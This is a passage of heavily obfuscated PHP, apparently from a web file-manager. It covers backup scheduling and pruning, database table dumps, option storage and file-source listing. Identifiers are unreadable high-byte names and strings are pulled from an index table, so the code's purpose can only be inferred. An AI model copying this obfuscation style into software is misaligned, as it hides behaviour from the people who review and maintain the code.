$this->initData($ù•§¸ÚÛ, $ò ‰”Áœ[$£ĞåÑÓ‘[849]]); } else { $this->checkStore($ò ‰”Áœ[$£ĞåÑÓ‘[849]]); } } self::$option = $ò ‰”Áœ; } private function isManual() { $÷ïÄŞ¤Ş = _get($GLOBALS, $_SERVER[±Ö‰ô½¯][850], 0); $÷ïÄŞ¤Ş = intval($÷ïÄŞ¤Ş); self::$manual = $÷ïÄŞ¤Ş && $÷ïÄŞ¤Ş == 1 ? 1 : 0; } private function initData($Ò¸Ş­í = 0, $õ¯²èğ¾ = '') { $‰¿ı² =& $_SERVER[±Ö‰ô½¯]; $ø°Úªå´ = $this->model->config(); if ($õ¯²èğ¾ && $ø°Úªå´[$‰¿ı²[849]] != $õ¯²èğ¾) { $Ò¸Ş­í = 0; } $this->checkStore($ø°Úªå´[$‰¿ı²[849]]); if (self::$manual == 1) { self::$name .= $‰¿ı²[11] . date($‰¿ı²[851]); } $À»É„Üê = array($‰¿ı²[849] => $ø°Úªå´[$‰¿ı²[849]], $‰¿ı²[32] => self::$name, $‰¿ı²[847] => 0, $‰¿ı²[170] => $ø°Úªå´[$‰¿ı²[170]], $‰¿ı²[852] => self::$manual, $‰¿ı²[853] => array($‰¿ı²[854] => array($‰¿ı²[847] => 0), $‰¿ı²[855] => array($‰¿ı²[847] => 0, $‰¿ı²[856] => 0, $‰¿ı²[857] => 0, $‰¿ı²[33] => $‰¿ı²[12], $‰¿ı²[858] => 0, $‰¿ı²[859] => 0), $‰¿ı²[860] => array($‰¿ı²[847] => 0, $‰¿ı²[856] => 0, $‰¿ı²[857] => 0, $‰¿ı²[858] => 0, $‰¿ı²[859] => 0), $‰¿ı²[232] => array($‰¿ı²[847] => 0, $‰¿ı²[861] => 0, $‰¿ı²[862] => 0, $‰¿ı²[863] => 0, $‰¿ı²[864] => 0, $‰¿ı²[554] => $Ò¸Ş­í, $‰¿ı²[858] => 0, $‰¿ı²[859] => 0)), $‰¿ı²[858] => time(), $‰¿ı²[859] => 0); $ğ‰ƒŠüõ = $this->model->insert($À»É„Üê); $À»É„Üê[$‰¿ı²[484]] = $ğ‰ƒŠüõ; return $À»É„Üê; } private function checkStore($‚£ƒÌñí) { $ÕŒïÈ¯­ = Model($_SERVER[±Ö‰ô½¯][865]); $ÀµÖÎŒù = $ÕŒïÈ¯­->listData($‚£ƒÌñí); $ÕŒïÈ¯­->checkConfig($ÀµÖÎŒù); } public static function get() { if (!self::$option) { $†«ÊˆÌì = Model($_SERVER[±Ö‰ô½¯][845]); $ºÂä»£ü = $†«ÊˆÌì->findByName(self::$name); $†«ÊˆÌì->parseContent($ºÂä»£ü); self::$option = $ºÂä»£ü; } return self::$option; } public static function set($±Ü¥š½ê) { $¿¦Ç†Ê =& $_SERVER[±Ö‰ô½¯]; $”ü‡Óì› = self::get(); foreach ($±Ü¥š½ê as $¾÷Ğ¯­é => $Ÿ¤¯àª²) { array_set_value($”ü‡Óì›, $¾÷Ğ¯­é, $Ÿ¤¯àª²); } Model($¿¦Ç†Ê[845])->update($”ü‡Óì›[$¿¦Ç†Ê[484]], $”ü‡Óì›); self::$option = $”ü‡Óì›; return self::$option; } public function keep() { $ƒ›é¤»ä =& $_SERVER[±Ö‰ô½¯]; $œÌ‚Ëù¹ = self::get(); if (_get($œÌ‚Ëù¹, $ƒ›é¤»ä[866], 0) == $ƒ›é¤»ä[91]) { return; } $this->backupKeep($œÌ‚Ëù¹); self::set(array($ƒ›é¤»ä[866] => 1)); } private function backupKeep($Û¨ì¶²ß) { $ÃÚíÍ”’ =& $_SERVER[±Ö‰ô½¯]; if (self::$manual == 1) { return; } $¤Å‰¸ = $this->model->listData(); if (empty($¤Å‰¸)) { return; } $ÀµÃ–áè = array(); $ğŒÉ¡İ« = array(); $ûæÄˆ« = date($ÃÚíÍ”’[867], strtotime($ÃÚíÍ”’[868])); foreach ($¤Å‰¸ as $æÄä™ê¾ => $£¶åèêÈ) { $ğˆ¶œ¤´ = $£¶åèêÈ[$ÃÚíÍ”’[32]]; if ($æÄä™ê¾ < 7 || $£¶åèêÈ[$ÃÚíÍ”’[852]] == $ÃÚíÍ”’[91]) { $ÀµÃ–áè[] = $ğˆ¶œ¤´; continue; } $âŞ¾¶…Ş = substr($ğˆ¶œ¤´, 0, 6); if ($âŞ¾¶…Ş < $ûæÄˆ«) { continue; } if (!isset($ğŒÉ¡İ«[$âŞ¾¶…Ş]) || $ğˆ¶œ¤´ < $ğŒÉ¡İ«[$âŞ¾¶…Ş]) { $ğŒÉ¡İ«[$âŞ¾¶…Ş] = $ğˆ¶œ¤´; } if (substr($ğˆ¶œ¤´, 6, 2) == $ÃÚíÍ”’[869]) { $ğŒÉ¡İ«[$âŞ¾¶…Ş] = $ğˆ¶œ¤´; } } $ÀµÃ–áè = array_merge($ÀµÃ–áè, array_values($ğŒÉ¡İ«)); $ÀµÃ–áè = array_unique($ÀµÃ–áè); foreach ($¤Å‰¸ as $£¶åèêÈ) { $ğˆ¶œ¤´ = $£¶åèêÈ[$ÃÚíÍ”’[32]]; if (!empty($ğˆ¶œ¤´) && in_array($ğˆ¶œ¤´, $ÀµÃ–áè)) { continue; } $this->model->remove($£¶åèêÈ[$ÃÚíÍ”’[484]]); $Ê´Šù¾… = $this->backupPath($Û¨ì¶²ß); IO::remove($Ê´Šù¾…, !1); } } private function backupPath($‹×Èô«) { $Ù„ß¼ÄÅ =& $_SERVER[±Ö‰ô½¯]; static $œ­¡§³® = null; if (is_null($œ­¡§³®)) { $œ­¡§³® = Model($Ù„ß¼ÄÅ[870])->get($Ù„ß¼ÄÅ[871]); } $¸¸‚¨·º = $‹×Èô«[$Ù„ß¼ÄÅ[32]]; $Îš¢‚Æ¡ = substr(md5($Ù„ß¼ÄÅ[872] . $œ­¡§³® . $¸¸‚¨·º), 0, 8); return "\x7b\x69\x6f\72{$‹×Èô«[$Ù„ß¼ÄÅ[849]]}\175\57\x64\x61\x74\x61\x62\141\x73\x65\57\x62\141\x63\153\x75\160\57" . $¸¸‚¨·º . $Ù„ß¼ÄÅ[11] . $Îš¢‚Æ¡; } public function db() { $Ù²û”² =& $_SERVER[±Ö‰ô½¯]; $ïÖâ®§’ = self::get(); if (_get($ïÖâ®§’, $Ù²û”²[873], 0) == $Ù²û”²[91]) { return !0; } $õó”®š = new BackupDb(); if (!$õó”®š->index()) { return !1; } self::set(array($Ù²û”²[873] => 1)); return !0; } public function dbFile() { $•­šõ²õ =& $_SERVER[±Ö‰ô½¯]; $ˆŠ¶Ì™Ì = self::get(); if (_get($ˆŠ¶Ì™Ì, $•­šõ²õ[874], 0) == $•­šõ²õ[91]) { return !0; } $µöŞ¤Í = new BackupDbFile(); if (!$µöŞ¤Í->index()) { return !1; } self::set(array($•­šõ²õ[874] => 1)); return !0; } public function file() { $ş­ê‘äè =& $_SERVER[±Ö‰ô½¯]; $¤Å°œ£Å = self::get(); if (_get($¤Å°œ£Å, $ş­ê‘äè[875], 0) == $ş­ê‘äè[91]) { return !0; } if ($¤Å°œ£Å[$ş­ê‘äè[170]] == $ş­ê‘äè[876]) { $¹„Ãøûğ = new BackupFile(); if (!$¹„Ãøûğ->index()) { return !1; } } self::set(array($ş­ê‘äè[875] => 1, $ş­ê‘äè[847] => 1)); return !0; } public static function log($ï´Ùš•¢) { write_log($ï´Ùš•¢, $_SERVER[±Ö‰ô½¯][877]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¥ããî¯— =& $_SERVER[±Ö‰ô½¯]; $ªù³õ˜Æ = Backup::get(); self::$io = $ªù³õ˜Æ[$¥ããî¯—[849]]; self::$name = $ªù³õ˜Æ[$¥ããî¯—[32]]; $ıóòØà = new DbManage(); $˜ÎŒªú‹ = $ıóòØà->dbType(); $ÖçÄ»Î = array($¥ããî¯—[878] => $˜ÎŒªú‹, $¥ããî¯—[879] => time()); Backup::set($ÖçÄ»Î); $²šÉïÎ„ = $this->tmpFilesPath() . $¥ããî¯—[880] . self::$name . $¥ããî¯—[8]; del_dir($²šÉïÎ„); mk_dir($²šÉïÎ„); $ñ™‡æÆı = $ù±„Ä¬ = 0; try { $Ë•¿×Å½ = $ıóòØà->db()->getTables(); } catch (Exception $©¾…™Ì‚) { Backup::log($¥ããî¯—[881] . $©¾…™Ì‚->getMessage()); return !1; } $Ë•¿×Å½ = array_diff($Ë•¿×Å½, array($¥ããî¯—[882], $¥ããî¯—[883])); foreach ($Ë•¿×Å½ as $¡öÜçØÅ) { if ($¡öÜçØÅ == $¥ããî¯—[884]) { continue; } $ñ™‡æÆı += $ıóòØà->model($¡öÜçØÅ)->count(); } $”çú·Ó¤ = new Task($¥ããî¯—[885], $¥ããî¯—[877], $ñ™‡æÆı, LNG($¥ããî¯—[886]) . $¥ããî¯—[887] . LNG($¥ããî¯—[888])); $GLOBALS[$¥ããî¯—[889]] = self::$name; foreach ($Ë•¿×Å½ as $¡öÜçØÅ) { $Âğ¤‘‡ = $²šÉïÎ„ . $¡öÜçØÅ . $¥ããî¯—[890]; if ($¡öÜçØÅ == $¥ããî¯—[884]) { @touch($Âğ¤‘‡); continue; } $ç°Ê°Ì = null; if ($¡öÜçØÅ == $¥ããî¯—[891] && $ªù³õ˜Æ[$¥ããî¯—[170]] == $¥ããî¯—[876]) { $ç°Ê°Ì = self::$io; } $ù±„Ä¬ += $ıóòØà->sqlFromDb($¡öÜçØÅ, $Âğ¤‘‡, $”çú·Ó¤, $ç°Ê°Ì); } unset($GLOBALS[$¥ããî¯—[889]]); $”çú·Ó¤->end(); if ($ù±„Ä¬ > $ñ™‡æÆı) { $ñ™‡æÆı = $ù±„Ä¬; } $ÖçÄ»Î = array($¥ããî¯—[878] => $˜ÎŒªú‹, $¥ããî¯—[873] => 1, $¥ããî¯—[892] => $ñ™‡æÆı, $¥ããî¯—[893] => $ù±„Ä¬, $¥ããî¯—[894] => time()); Backup::set($ÖçÄ»Î); if ($ñ™‡æÆı - $ù±„Ä¬ > 0) { $´“˜ÑÒ = $¥ããî¯—[895]; if (!stristr(I18n::getType(), $¥ããî¯—[896])) { $´“˜ÑÒ = $¥ããî¯—[897]; } Backup::log(array($´“˜ÑÒ, $ÖçÄ»Î)); return !1; } return !0; } private function tmpFilesPath() { $‡‡ãö…™ =& $_SERVER[±Ö‰ô½¯]; $à«»§Å = TEMP_FILES; if ($GLOBALS[$‡‡ãö…™[6]][$‡‡ãö…™[92]][$‡‡ãö…™[898]]) { $à«»§Å = $GLOBALS[$‡‡ãö…™[6]][$‡‡ãö…™[92]][$‡‡ãö…™[898]]; if (!mk_dir($à«»§Å) || !is_writable($à«»§Å) || !IO::mkfile($à«»§Å . $‡‡ãö…™[899])) { $à«»§Å = TEMP_FILES; } } return $à«»§Å; } } goto FÇæ…‰°–; d„³Šà³œ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\117\x70\x74\151\157\x6e"; public $field = array(); public function listData($Ğ×âÍ—Ê = false, $£®¤²Ÿõ = "\155\x6f\144\x69\146\x79\x54\151\x6d\x65", $°ÓùáÔ« = false) { $³ğà‹õí =& $_SERVER[±Ö‰ô½¯]; $»Í¬©Ô¦ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÔÎ…‡°… = array_values($»Í¬©Ô¦); if ($ÔÎ…‡°… && $ÔÎ…‡°…[0] && !is_array($ÔÎ…‡°…[0])) { Model($this->modelType)->cacheRemove($this->optionType); $»Í¬©Ô¦ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$»Í¬©Ô¦) { return $Ğ×âÍ—Ê ? null : array(); } if (!$Ğ×âÍ—Ê && $Ğ×âÍ—Ê !== $³ğà‹õí[230]) { $»Í¬©Ô¦ = array_filter(array_values($»Í¬©Ô¦)); return array_sort_by($»Í¬©Ô¦, $£®¤²Ÿõ, $°ÓùáÔ«, $³ğà‹õí[484]); } return $»Í¬©Ô¦[$³ğà‹õí[485] . $Ğ×âÍ—Ê]; } public function insert($è¾ê¥ì) { $¨Öæä‰ =& $_SERVER[±Ö‰ô½¯]; $è¾ê¥ì = array_field_key($è¾ê¥ì, $this->field); $öŒùØÉÁ = Model($this->modelType)->get($¨Öæä‰[486], $this->optionType . $¨Öæä‰[487]); $öŒùØÉÁ = $öŒùØÉÁ ? $öŒùØÉÁ : 0; $è¾ê¥ì[$¨Öæä‰[484]] = ++$öŒùØÉÁ; $è¾ê¥ì[$¨Öæä‰[233]] = time(); $è¾ê¥ì[$¨Öæä‰[88]] = time(); Model($this->modelType)->set($¨Öæä‰[486], $öŒùØÉÁ, $this->optionType . $¨Öæä‰[487]); Model($this->modelType)->set($¨Öæä‰[485] . $öŒùØÉÁ, $è¾ê¥ì, $this->optionType); return $öŒùØÉÁ; } public function insertArr($Ôá‚¼ò²) { $¨‹©˜§¤ =& $_SERVER[±Ö‰ô½¯]; if (!$Ôá‚¼ò² || !is_array($Ôá‚¼ò²)) { return !1; } $ÚÉãÛ¦í = Model($this->modelType)->get($¨‹©˜§¤[486], $this->optionType . $¨‹©˜§¤[487]); $ÚÉãÛ¦í = $ÚÉãÛ¦í ? $ÚÉãÛ¦í : 0; $¡‡ Õî = array(); foreach ($Ôá‚¼ò² as $Ú©ÃÚÇ®) { $‚èå˜ = array_field_key($Ú©ÃÚÇ®, $this->field); $‚èå˜[$¨‹©˜§¤[484]] = ++$ÚÉãÛ¦í; $‚èå˜[$¨‹©˜§¤[233]] = time(); $‚èå˜[$¨‹©˜§¤[88]] = time(); $¡‡ Õî[$¨‹©˜§¤[485] . $ÚÉãÛ¦í] = $‚èå˜; } Model($this->modelType)->set($¨‹©˜§¤[486], $ÚÉãÛ¦í, $this->optionType . $¨‹©˜§¤[487]); Model($this->modelType)->set($¡‡ Õî, !1, $this->optionType); return $ÚÉãÛ¦í; } public function update($¼‰­©Ú, $“Ü­˜) { $ì¶«øæ˜ =& $_SERVER[±Ö‰ô½¯]; $“Ü­˜ = array_field_key($“Ü­˜, $this->field); $§Âş„î¥ = $this->listData($¼‰­©Ú); if (!$§Âş„î¥ || !$¼‰­©Ú) { return !1; } $“Ü­˜ = array_merge($§Âş„î¥, $“Ü­˜); $“Ü­˜[$ì¶«øæ˜[88]] = time(); return Model($this->modelType)->set($ì¶«øæ˜[485] . $¼‰­©Ú, $“Ü­˜, $this->optionType); } public function remove($Í®ú”‡ù) { if (!$Í®ú”‡ù) { return !1; } return Model($this->modelType)->remove($_SERVER[±Ö‰ô½¯][485] . $Í®ú”‡ù, $this->optionType); } public function removeArr($Ú³Ò—Ê) { if (!$Ú³Ò—Ê) { return !0; } $í©Åêëª = array(); foreach ($Ú³Ò—Ê as $œ›°ÙœÏ) { $í©Åêëª[] = $_SERVER[±Ö‰ô½¯][485] . $œ›°ÙœÏ; } return Model($this->modelType)->removeArr($í©Åêëª, $this->optionType); } public function clear() { $Ä™¾ì½ =& $_SERVER[±Ö‰ô½¯]; Model($this->modelType)->remove($Ä™¾ì½[486], $this->optionType . $Ä™¾ì½[487]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¹ÉòÏë³, $­„™Ÿ¢±) { if (!$­„™Ÿ¢±) { return !1; } $›¶‡”Îç = $this->listData(); $›¶‡”Îç = array_to_keyvalue($›¶‡”Îç, $¹ÉòÏë³); return isset($›¶‡”Îç[$­„™Ÿ¢±]) ? $›¶‡”Îç[$­„™Ÿ¢±] : !1; } public function findByName($–Ùƒ×Ä) { return $this->findByKey($_SERVER[±Ö‰ô½¯][32], $–Ùƒ×Ä); } protected function resetData($³ÙŠ…òÏ) { $ÄÇ¤’çÕ =& $_SERVER[±Ö‰ô½¯]; if (!$³ÙŠ…òÏ) { return; } $³ÙŠ…òÏ = is_array($³ÙŠ…òÏ) ? $³ÙŠ…òÏ : array(); $¦İšíŞÂ = array(); for ($˜ıªÏœí = 0; $˜ıªÏœí < count($³ÙŠ…òÏ); $˜ıªÏœí++) { if (!$³ÙŠ…òÏ[$˜ıªÏœí] || !$³ÙŠ…òÏ[$˜ıªÏœí][$ÄÇ¤’çÕ[484]]) { continue; } $¦İšíŞÂ[$ÄÇ¤’çÕ[485] . $³ÙŠ…òÏ[$˜ıªÏœí][$ÄÇ¤’çÕ[484]]] = $³ÙŠ…òÏ[$˜ıªÏœí]; } return Model($this->modelType)->set($¦İšíŞÂ, !1, $this->optionType); } private function getAutoName($€Ğı¯¹Ì) { $ëï’œ¹› = array_to_keyvalue($this->listData(), $_SERVER[±Ö‰ô½¯][32]); if (!$ëï’œ¹› || !isset($ëï’œ¹›[$€Ğı¯¹Ì])) { return $€Ğı¯¹Ì; } for ($à˜¼Öš = 1; $à˜¼Öš < count($ëï’œ¹›); $à˜¼Öš++) { $ßÓ”Ñ¡ = $€Ğı¯¹Ì . "\x28{$à˜¼Öš}\51"; if (!isset($ëï’œ¹›[$ßÓ”Ñ¡])) { return $ßÓ”Ñ¡; } } return $ßÓ”Ñ¡; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¯ÌŠª³ª = false, $§•ÑúÒ… = '', $œÁ”–ÇŸ = false, $¡ÅÈ– = true) { $¦å›óÃ‡ =& $_SERVER[±Ö‰ô½¯]; $±Ù×À¼ = $this->cacheGet($§•ÑúÒ…); $²ãñğğŞ = $this->optionDefault($§•ÑúÒ…); $²ãñğğŞ = is_array($²ãñğğŞ) ? $²ãñğğŞ : array(); if (is_array($±Ù×À¼)) { if ($¡ÅÈ–) { $±Ù×À¼ = array_merge($²ãñğğŞ, $±Ù×À¼); } return $¯ÌŠª³ª ? isset($±Ù×À¼[$¯ÌŠª³ª]) ? $±Ù×À¼[$¯ÌŠª³ª] : null : $±Ù×À¼; } $ÃÏ‰Éó = $this->filterWhere(array($¦å›óÃ‡[33] => $§•ÑúÒ…)); $±Ù×À¼ = $this->where($ÃÏ‰Éó)->select(); $±Ù×À¼ = array_to_keyvalue($±Ù×À¼, $¦å›óÃ‡[95], $¦å›óÃ‡[452]); foreach ($±Ù×À¼ as $†õ•Õá¸ => $Îş’öÒù) { if ($œÁ”–ÇŸ || in_array($†õ•Õá¸, $this->jsonField)) { $±Ù×À¼[$†õ•Õá¸] = json_decode($Îş’öÒù, !0); } } $this->cacheSet($§•ÑúÒ…, $±Ù×À¼); if ($¡ÅÈ–) { $±Ù×À¼ = array_merge($²ãñğğŞ, $±Ù×À¼); } return $¯ÌŠª³ª ? $±Ù×À¼[$¯ÌŠª³ª] : $±Ù×À¼; } public function set($Ãíµ€Îì, $êç©‡ßä = false, $ÀªÉï³Ğ = '') { $çûîÃå =& $_SERVER[±Ö‰ô½¯]; if (!$Ãíµ€Îì) { return !0; } $Ì‹îÁÉÓ = $this->get(!1, $ÀªÉï³Ğ, !1, !1); $Ì‹îÁÉÓ = is_array($Ì‹îÁÉÓ) ? $Ì‹îÁÉÓ : array(); $¼ò¹–È = array(); $»…ÉŸ¶ß = array(); $§·ÖßË = array(); $îõæ«³ğ = is_array($Ãíµ€Îì) ? $Ãíµ€Îì : array($Ãíµ€Îì => $êç©‡ßä); $û¼…ÊÏ” = $this->filterWhere(array($çûîÃå[33] => $ÀªÉï³Ğ)); foreach ($îõæ«³ğ as $”’•ÒÖİ => $ºµ¹®Õ) { if (is_array($ºµ¹®Õ)) { $ºµ¹®Õ = json_encode_force($ºµ¹®Õ); } $this->checkLength($ºµ¹®Õ, !1, $this->tableName . $çûîÃå[4] . $Ãíµ€Îì); $ºµ¹®Õ = self::textEncode($ºµ¹®Õ); if (array_key_exists($”’•ÒÖİ, $Ì‹îÁÉÓ)) { $ó ‘¥¢£ = is_array($Ì‹îÁÉÓ[$”’•ÒÖİ]) ? json_encode_force($Ì‹îÁÉÓ[$”’•ÒÖİ]) : $Ì‹îÁÉÓ[$”’•ÒÖİ]; $ó ‘¥¢£ = self::textEncode($ó ‘¥¢£); if ($ó ‘¥¢£ === $ºµ¹®Õ) { continue; } $»…ÉŸ¶ß[] = array($çûîÃå[95], $”’•ÒÖİ, $çûîÃå[452], $ºµ¹®Õ, $çûîÃå[88], time()); } else { $œ©Œç£Ü = array($çûîÃå[33] => $ÀªÉï³Ğ, $çûîÃå[95] => $”’•ÒÖİ, $çûîÃå[452] => $ºµ¹®Õ); $¼ò¹–È[] = $this->filterWhere($œ©Œç£Ü); } } if (!$¼ò¹–È && !$»…ÉŸ¶ß) { return !0; } $this->cacheRemove($ÀªÉï³Ğ); $ìà¼ş™Â = $this->cacheKey($çûîÃå[488]); CacheLock::lock($ìà¼ş™Â); if ($¼ò¹–È) { $this->addAll($¼ò¹–È); } if ($»…ÉŸ¶ß) { $this->saveAll($»…ÉŸ¶ß, $û¼…ÊÏ”); } CacheLock::unlock($ìà¼ş™Â); return !0; } protected function optionDefault($ïœ·À³ì = '') { return !1; } public function setDeep($şÑ¶­ñ, $óÍ²ô¦­ = false, $Ì«‡œ½¢ = '') { $öŞÒ‘¶ = explode($_SERVER[±Ö‰ô½¯][10], $şÑ¶­ñ); $ê£ºÛ·Ú = $this->get(); array_set_value($ê£ºÛ·Ú, $şÑ¶­ñ, $óÍ²ô¦­); $this->set($öŞÒ‘¶[0], $ê£ºÛ·Ú[$öŞÒ‘¶[0]], $Ì«‡œ½¢); } public function remove($¡Ï‡ÀÌÃ, $«Åà¨õ = '') { $¼ ÚÕÆ =& $_SERVER[±Ö‰ô½¯]; $this->cacheRemove($«Åà¨õ); $Îßûå» = $this->filterWhere(array($¼ ÚÕÆ[95] => $¡Ï‡ÀÌÃ, $¼ ÚÕÆ[33] => $«Åà¨õ)); if (is_null($¡Ï‡ÀÌÃ)) { unset($Îßûå»[$¼ ÚÕÆ[95]]); } return $this->where($Îßûå»)->delete(); } public function removeArr($ì¾Â±¥, $µÓº˜ûâ = '') { $ˆá³ŠŒ =& $_SERVER[±Ö‰ô½¯]; if (!$ì¾Â±¥ || !is_array($ì¾Â±¥)) { return !0; } $this->cacheRemove($µÓº˜ûâ); $Å—“¿†¤ = $this->filterWhere(array($ˆá³ŠŒ[33] => $µÓº˜ûâ, $ˆá³ŠŒ[95] => array($ˆá³ŠŒ[7], $ì¾Â±¥))); return $this->where($Å—“¿†¤)->delete(); } public function cacheSet($¦›Ñ—Ôã, $Ã´ºœÈ… = false) { return Cache::set($this->cacheKey($¦›Ñ—Ôã), $Ã´ºœÈ…); } public function cacheGet($’¡Ï»÷) { return Cache::get($this->cacheKey($’¡Ï»÷)); } public function cacheRemove($Ğ­Å¶) { return Cache::remove($this->cacheKey($Ğ­Å¶)); } protected function filterWhere($ö”Ôéê) { return $ö”Ôéê; } protected function cacheKey($È÷Øêõ) { return $È÷Øêõ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\x61\x6d\x65" => "\151\157\137\163\157\165\162\x63\145\x5f\155\x65\x74\141", "\155\x65\164\141\x46\x69\145\154\144" => "\x73\x6f\165\162\143\x65\x49\104"); protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\151\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\x75\156\x63\164\151\x6f\x6e"), array("\x63\162\x65\141\x74\145\124\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\166\x69\x65\167\x54\151\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\x65\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¥º¯°Ç¦) { return $this->listSource(array($_SERVER[±Ö‰ô½¯][489] => $¥º¯°Ç¦)); } public function typeName($…Œİá½é) { static $——¼æÉõ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $——¼æÉõ[$…Œİá½é . $_SERVER[±Ö‰ô½¯][12]]; } public function sourceListInfo($äğ©Ñ‡Ú, $¿µ‰ÀŸÂ = false) { $ğÎİ“¤ =& $_SERVER[±Ö‰ô½¯]; $äğ©Ñ‡Ú = $äğ©Ñ‡Ú ? $äğ©Ñ‡Ú : array(); $äğ©Ñ‡Ú = array_filter(array_unique($äğ©Ñ‡Ú)); if (!$äğ©Ñ‡Ú) { return array(); } $Ø³‰Òê€ = $this->where(array($ğÎİ“¤[193] => array($ğÎİ“¤[7], $äğ©Ñ‡Ú)))->select(); $this->_listDataApply($Ø³‰Òê€, $¿µ‰ÀŸÂ); return array_to_keyvalue($Ø³‰Òê€, $ğÎİ“¤[193]); } public function pathInfoFilter(&$ŠÔ´Âø) { $–À¨÷ï =& $_SERVER[±Ö‰ô½¯]; static $±ŒĞªñ = false; static $»ØÕ¨Œß = false; static $›€‚Ûë = false; if (!$±ŒĞªñ) { $ªöÖºöı = $–À¨÷ï[490]; $ªöÖºöı .= $–À¨÷ï[491]; $ªöÖºöı .= $–À¨÷ï[492]; $¬Â®ª‹Í = $–À¨÷ï[493]; $á»ò±ƒ = explode($–À¨÷ï[50], $¬Â®ª‹Í); $±ŒĞªñ = explode($–À¨÷ï[50], $ªöÖºöı); $»ØÕ¨Œß = array(); foreach ($±ŒĞªñ as $èîÉŸ¢„) { if (in_array($èîÉŸ¢„, $á»ò±ƒ)) { continue; } $»ØÕ¨Œß[] = $èîÉŸ¢„; } $›€‚Ûë = explode($–À¨÷ï[50], $–À¨÷ï[494]); } foreach ($›€‚Ûë as $”ÏÙ¤ôó) { if (isset($ŠÔ´Âø[$”ÏÙ¤ôó])) { $ŠÔ´Âø[$”ÏÙ¤ôó] = intval($ŠÔ´Âø[$”ÏÙ¤ôó]); } } $ŠÔ´Âø[$–À¨÷ï[87]] = $–À¨÷ï[495] . $ŠÔ´Âø[$–À¨÷ï[193]] . $–À¨÷ï[496]; $ŠÔ´Âø[$–À¨÷ï[33]] = $ŠÔ´Âø[$–À¨÷ï[497]] == 1 ? $–À¨÷ï[78] : $–À¨÷ï[232]; $ŠÔ´Âø[$–À¨÷ï[190]] = $this->typeName($ŠÔ´Âø[$–À¨÷ï[190]]); if ($ŠÔ´Âø[$–À¨÷ï[497]] != 1) { $ŠÔ´Âø[$–À¨÷ï[168]] = $ŠÔ´Âø[$–À¨÷ï[498]]; unset($ŠÔ´Âø[$–À¨÷ï[498]]); } $‹†ÜÎ°› = $±ŒĞªñ; if (isset($ŠÔ´Âø[$–À¨÷ï[499]]) && $ŠÔ´Âø[$–À¨÷ï[499]][$–À¨÷ï[500]] == -1) { $‹†ÜÎ°› = $»ØÕ¨Œß; } $ŠÔ´Âø = array_field_key($ŠÔ´Âø, $‹†ÜÎ°›); return $ŠÔ´Âø; } public function listUserFav() { $°ì±ÓÚŞ =& $_SERVER[±Ö‰ô½¯]; $µØùâÏ = Model($°ì±ÓÚŞ[501])->listData(); $® ‹úŠø = array_filter_by_field($µØùâÏ, $°ì±ÓÚŞ[33], $°ì±ÓÚŞ[502]); $® ‹úŠø = array_to_keyvalue($® ‹úŠø, $°ì±ÓÚŞ[12], $°ì±ÓÚŞ[87]); if ($® ‹úŠø) { $Ş‹±‘Ú¤ = $this->listSource(array($°ì±ÓÚŞ[503] => array($°ì±ÓÚŞ[504], $® ‹úŠø))); } $Ş‹±‘Ú¤ = array_to_keyvalue($Ş‹±‘Ú¤[$°ì±ÓÚŞ[447]], $°ì±ÓÚŞ[193]); foreach ($µØùâÏ as &$™åÌÙ™í) { $™åÌÙ™í = array($°ì±ÓÚŞ[505] => $™åÌÙ™í[$°ì±ÓÚŞ[484]], $°ì±ÓÚŞ[506] => $™åÌÙ™í[$°ì±ÓÚŞ[32]], $°ì±ÓÚŞ[507] => $™åÌÙ™í[$°ì±ÓÚŞ[87]], $°ì±ÓÚŞ[508] => $™åÌÙ™í[$°ì±ÓÚŞ[33]], $°ì±ÓÚŞ[509] => $™åÌÙ™í[$°ì±ÓÚŞ[233]], $°ì±ÓÚŞ[510] => $™åÌÙ™í[$°ì±ÓÚŞ[88]]); if ($™åÌÙ™í[$°ì±ÓÚŞ[33]] == $°ì±ÓÚŞ[502] && $Ş‹±‘Ú¤[$™åÌÙ™í[$°ì±ÓÚŞ[87]]]) { $™åÌÙ™í[$°ì±ÓÚŞ[90]] = $Ş‹±‘Ú¤[$™åÌÙ™í[$°ì±ÓÚŞ[87]]]; } } unset($™åÌÙ™í); return $µØùâÏ; } public function listUserTag($‘ª×ìäš) { $É£Ñæ» =& $_SERVER[±Ö‰ô½¯]; if ($‘ª×ìäš && !is_array($‘ª×ìäš)) { $‘ª×ìäš = array($‘ª×ìäš); } $’ºóôüÃ = Model($É£Ñæ»[511])->listData(); $íÀ€’º† = array(); $úŞ ¼¹Ó = array(); foreach ($’ºóôüÃ as $€–Ò²ÌÅ) { $‹é­ïÑŸ = $€–Ò²ÌÅ[$É£Ñæ»[87]]; if (!$‹é­ïÑŸ) { continue; } if (!isset($úŞ ¼¹Ó[$‹é­ïÑŸ])) { $úŞ ¼¹Ó[$‹é­ïÑŸ] = array(); } $úŞ ¼¹Ó[$‹é­ïÑŸ][] = $€–Ò²ÌÅ[$É£Ñæ»[512]]; $íÀ€’º†[$€–Ò²ÌÅ[$É£Ñæ»[87]]] = $€–Ò²ÌÅ; } $‰’”ÑÛ© = array(); $šÏŸã©Ó = array(); $÷İÄëŞŞ = array(); foreach ($úŞ ¼¹Ó as $ºÚ•íÉÅ => $“…ÔÈË) { $áÌÛäò = !0; if (!$‘ª×ìäš) { $‰’”ÑÛ©[] = 